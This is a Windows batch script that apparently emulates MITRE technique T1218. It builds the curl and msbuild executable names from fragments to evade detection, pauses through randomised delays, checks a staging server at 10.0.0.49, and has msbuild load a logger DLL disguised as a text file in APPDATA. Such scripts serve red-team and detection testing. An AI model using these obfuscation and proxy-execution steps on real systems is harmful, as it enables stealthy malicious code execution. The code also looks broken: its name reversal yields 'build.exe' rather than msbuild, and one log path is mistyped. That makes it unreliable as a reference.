@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\7730\c2645a73
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7730-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=illustrator.txt
SET dvhhyc=7730
SET debugvar=1

REM Log file path
SET logvar=%APPDATA%\!rrocubc!\macula-simulations.log

REM Script initialization debug log
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_START=initializing>> "!logvar!" 2>nul)

REM Initial delay (30-60 seconds)
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=45s>> "!logvar!" 2>nul)
timeout /t 45 /nobreak >nul
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=success|errorlevel=0>> "!logvar!" 2>nul)

REM Obfuscate curl.exe - character-by-character assembly
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: OBFUSCATION_START=curl.exe>> "!logvar!" 2>nul)
SET qe=c
SET wb=u
SET lt=r
SET rt=l
SET curlbin=%qe%%wb%%lt%%rt%.exe
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: OBFUSCATION_RESULT=!curlbin!|errorlevel=0>> "!logvar!" 2>nul)

REM Obfuscate msbuild.exe - reverse string building
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: OBFUSCATION_START=msbuild.exe>> "!logvar!" 2>nul)
SET reversed=exe.dliubsem
SET msbuildbin=
for /l %%i in (0,1,100) do (
  if "!reversed:~%%i,1!" neq "" (
    SET msbuildbin=!reversed:~%%i,1!!msbuildbin!
  ) else (
    goto :done_msbuild
  )
)
:done_msbuild
SET msbuildbin=%msbuildbin:~3%
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: OBFUSCATION_RESULT=!msbuildbin!|errorlevel=0>> "logvar!" 2>nul)

REM Delay between operations
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=8s>> "!logvar!" 2>nul)
ping -n 8 127.0.0.1 >nul
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=success|errorlevel=0>> "!logvar!" 2>nul)

REM Step 1: Check server availability
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_START=!keghkgto!>> "!logvar!" 2>nul)
!curlbin! -k -s -o nul "!keghkgto!"
SET hb_result=!ERRORLEVEL!
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: HEARTBEAT_RESULT=errorlevel=!hb_result!>> "!logvar!" 2>nul)

REM Random delay (10-30 seconds)
SET /A rdelay=%RANDOM% %% 20 + 10
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=!rdelay!s>> "!logvar!" 2>nul)
timeout /t !rdelay! /nobreak >nul
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=success|errorlevel=0>> "!logvar!" 2>nul)

REM Step 2: Change to target directory
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR_START=!txisnba!>> "!logvar!" 2>nul)
cd /d "!txisnba!" >nul 2>&1
SET cd_result=!ERRORLEVEL!
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: CHDIR_RESULT=errorlevel=!cd_result!>> "!logvar!" 2>nul)

REM Final delay before execution
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_START=12s>> "!logvar!" 2>nul)
CHOICE /C Y /N /D Y /T 12 >nul
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DELAY_RESULT=success|errorlevel=0>> "!logvar!" 2>nul)

REM Step 3: Execute msbuild with LoggerEntry
SET dll_path=!txisnba!\\!xzanpex!
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_START=!msbuildbin! /logger:LoggerEntry,!dll_path!;MyParameters,Foo>> "!logvar!" 2>nul)

REM Get full path to msbuild
for %%i in (!msbuildbin!) do set "msbuild_full=%%~$PATH:i"

if "!msbuild_full!"=="" (
    SET ttp_result=0
    SET err_detail=msbuild_not_found
) else (
    "!msbuild_full!" /logger:LoggerEntry,"!dll_path!";MyParameters,Foo >nul 2>&1
    SET msbuild_result=!ERRORLEVEL!
    if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: PROCESS_RESULT=errorlevel=!msbuild_result!>> "!logvar!" 2>nul)
    
    if !msbuild_result! equ 0 (
        SET ttp_result=1
        SET err_detail=
    ) else (
        SET ttp_result=0
        SET err_detail=assembly_load_failed
    )
)

REM TTP Logging - T1218 Signed Binary Proxy Execution
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set ttp_ts=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!

(echo [!ttp_ts!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!logvar!") 2>nul

REM Script end debug log
if "!debugvar!"=="1" (echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: SCRIPT_END=exit_code=!ERRORLEVEL!>> "!logvar!" 2>nul)

ENDLOCAL